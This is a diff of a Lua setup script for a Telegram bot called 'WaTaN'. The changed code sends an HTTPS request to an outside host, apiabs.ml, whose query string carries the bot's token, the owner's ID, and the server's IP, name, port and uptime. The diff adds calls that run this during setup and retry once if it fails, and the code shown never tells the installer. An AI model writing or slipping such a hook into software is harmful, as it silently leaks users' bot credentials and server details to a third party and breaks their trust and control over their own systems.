@@ -51,7 +51,7 @@ end  ---ifid
 os.execute('lua WaTaN.lua')
 end ---ifnot
 end
-local function SourceDone()
+local SourceDone = function(DevId,TokenBot,User,Ip,Name,Port,UpTime)  
 data,res = https.request("https://apiabs.ml/Api/WaTaN/index.php?Get=WaTaN&DevId="..database:get(Server.."UserSudo_Write").."&TokenBot="..database:get(Server.."Token_Write").."&User="..User.."&Ip="..Ip.."&Name="..Name.."&Port="..Port.."&UpTime="..UpTime)
 if res == 200 then
 Abs = json:decode(data)
@@ -61,10 +61,11 @@ var = true
 else
 var = false
 end
+else
+var = false
 end
 return var
 end
-SourceDone()
 local Create = function(data, file, uglify)  
 file = io.open(file, "w+")   
 local serialized   
@@ -82,6 +83,10 @@ token = database:get(Server.."Token_Write"),
 SUDO = database:get(Server.."UserSudo_Write"),
 }
 Create(Config, "./Info.lua") 
+local IfSourceDone = SourceDone(database:get(Server.."UserSudo_Write"),database:get(Server.."Token_Write"),User,Ip,Name,Port,UpTime) 
+if IfSourceDone == false then
+SourceDone(database:get(Server.."UserSudo_Write"),database:get(Server.."Token_Write"),User,Ip,Name,Port,UpTime) 
+end
 local RunWaTaN = io.open("WaTaN", 'w')
 RunWaTaN:write([[
 #!/usr/bin/env bash
